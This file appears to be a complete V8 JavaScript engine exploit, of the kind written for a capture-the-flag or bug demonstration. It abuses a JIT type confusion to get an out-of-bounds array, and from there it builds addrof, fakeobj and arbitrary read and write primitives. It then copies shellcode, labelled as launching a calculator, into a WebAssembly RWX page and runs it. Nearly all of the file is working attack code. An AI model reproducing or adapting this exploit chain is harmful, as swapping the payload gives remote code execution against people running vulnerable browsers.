// helpers
// const dp = (x) => { %DebugPrint(x); }
// const sb = () => { %SystemBreak(); }

class Helpers {
  constructor() {
    this.buf = new ArrayBuffer(8);
    this.f64 = new Float64Array(this.buf);
    this.u64 = new Uint32Array(this.buf);
    this.buf2 = new ArrayBuffer(0x150);
    this.state = {};
  }

  ftoi = (val) => {
    this.f64[0] = val;
    return BigInt(this.u64[0]) + (BigInt(this.u64[1]) << 32n);
  }

  itof = (val) => {
    this.u64[0] = Number(val & 0xffffffffn);
    this.u64[1] = Number(val >> 32n);
    return this.f64[0];
  }

  hex = (val) => {
    return "0x" + val.toString(16);
  }

  info = (msg) => {
    console.log("[+] " + msg);
  }

  log = (msg) => {
    console.log("[*] " + msg);
  }
}

function pwn() {
  var shellcode = [16889928,16843009,1213202689,1652108984,23227744,70338561,800606244,796029813,1349413218,1760004424,16855099,19149953,1208025345,1397310648,1497451600,3526447165,1510500946,1390543176,1222805832,16843192,16843009,3091746817,1617066286,16867949,604254536,1966061640,1647276659,827354729,141186806,3858843742,3867756630,257440618,2425393157];

  var wasm_code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11]);
  var wasm_mod = new WebAssembly.Module(wasm_code);
  var wasm_instance = new WebAssembly.Instance(wasm_mod);
  var f = wasm_instance.exports.main;

  var helper = new Helpers();

  function jitme(a) {
    var y = 0x7fffffff;

    if (a == NaN) y = NaN;
    if (a) y = -1;

    let z = y + 1;
    z >>= 31;
    z = 0x80000000 - Math.sign(z|1);

    if(a) z = 0;

    var arr = new Array(0-Math.sign(z));
    arr.shift();

    var float_arr = [1.1, 1.2, 1.3];

    return [arr, float_arr];
  }

  // gc();

  for (var i=0;i<0x3000;++i)
    jitme(true);

  var x = jitme(false);
  var oob_arr = x[0];
  var float_arr = x[1];

  oob_arr[13] = 0x4242;       // overwrite length of float_arr
	helper.log("float_arr length: " + float_arr.length);
	helper.log("oob_arr length: " + oob_arr.length);

  function addrof(obj) {
    oob_arr[7] = obj;
    return helper.ftoi(float_arr[0]);
  }

  function fakeobj(addr) {
    float_arr[0] = helper.itof(addr);
    return oob_arr[7];
  }

  function arbRead(addr) {
    if (addr % 2n == 0) {
      addr += 1n;
    }
    let float_arr_map = helper.ftoi(float_arr[3]);
    let arb_rw_arr = [helper.itof(float_arr_map), 1.1, 1.2, 1.3];
    let fake = fakeobj(addrof(arb_rw_arr) - 0x20n);

    // Set elements pointer of fake object to address we wanna read, -0x10n since elemnts has length and map
    arb_rw_arr[2] = helper.itof(BigInt(addr) - 0x10n);

    // Access the index 0 of fake object will read the value
    return helper.ftoi(fake[0]);
  }

  function arbWrite(addr, val) {

    // Put fakeobj right on top of our array
    let float_arr_map = helper.ftoi(float_arr[3]);
    let arb_rw_arr = [helper.itof(float_arr_map), 1.1, 1.2, 1.3];
    let fake = fakeobj(addrof(arb_rw_arr) - 0x20n);

    // Set elements pointer of fake object to address we wanna write
    arb_rw_arr[2] = helper.itof(BigInt(addr) - 0x10n);

    // Set the value of index 0 of fake object will overwrite the value of elements[2]
    fake[0] = helper.itof(BigInt(val));
  }

  var rwx_page_addr = arbRead(addrof(wasm_instance)-1n+0x80n);
  helper.log("rwx_page_addr: " + helper.hex(rwx_page_addr));

  function copy_shellcode(addr, shellcode) {
    let buf = new ArrayBuffer(0x200);
    let dataview = new DataView(buf);
    let buf_addr = addrof(buf);
    let backing_store_addr = buf_addr + 0x20n;
    arbWrite(backing_store_addr, addr);

    for (let i = 0; i < shellcode.length; i++) {
	    dataview.setUint32(4*i, shellcode[i], true);
    }
  }

  console.log("[+] Copying xcalc shellcode to RWX page");
  copy_shellcode(rwx_page_addr, shellcode);

  f();
}

pwn();
